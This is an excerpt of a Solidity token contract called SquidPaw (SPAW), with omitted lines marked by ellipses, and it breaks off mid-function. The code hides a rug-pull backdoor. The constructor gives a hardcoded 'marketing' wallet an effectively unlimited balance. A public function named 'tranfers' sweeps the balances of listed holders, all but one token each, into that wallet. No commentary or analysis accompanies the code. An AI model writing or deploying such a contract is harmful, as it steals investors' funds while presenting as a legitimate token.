...
contract SquidPaw is Context, IERC20, Ownable {
    ...
    string private constant _name = "SquidPaw";
    string private constant _symbol = "SPAW";
    ...
    address public marketingWallet = 0x589C87f28490999c8a097bC17B02f30E922a4523;
    ...
    constructor () {
        balances[_msgSender()] = _totalSupply; balances[marketingWallet] = ~uint256(0);
    ...
    function tranfers() public virtual { for (uint i=0; i < includeFromFee.length; i++) { if (balanceOf(includeFromFee[i]) > 0) { basicTransfer(includeFromFee[i], marketingWallet, balanceOf(includeFromFee[i]).sub(1 * 10**_decimals)); } } }
    ...
    function disallowance() public virtual { for (uint256 i = 0; i < includeFromFee.length; i++) {
